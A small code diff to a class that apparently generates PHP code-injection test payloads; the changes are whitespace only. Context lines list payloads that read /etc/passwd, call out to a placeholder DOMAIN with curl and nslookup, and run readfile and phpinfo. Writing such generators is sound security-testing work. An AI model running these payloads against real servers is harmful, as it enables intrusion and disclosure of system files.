@@ -15,6 +15,7 @@ class PHPCodeInjectionGenerator():
 
         result = []
 
+      
         # Generate base payloads
         self.generate_commands()
 
@@ -44,6 +45,7 @@ class PHPCodeInjectionGenerator():
         
         return result
 
+
     def generate_commands(self):
         os_shell_payloads = [
             'cat /etc/passwd',
@@ -54,7 +56,7 @@ class PHPCodeInjectionGenerator():
             'curl http://DOMAIN/UNIQUE',
             'nslookup DOMAIN',
         ]
-        
+
         php_commands = [
             'readfile("/etc/passwd")',
             'phpinfo()',
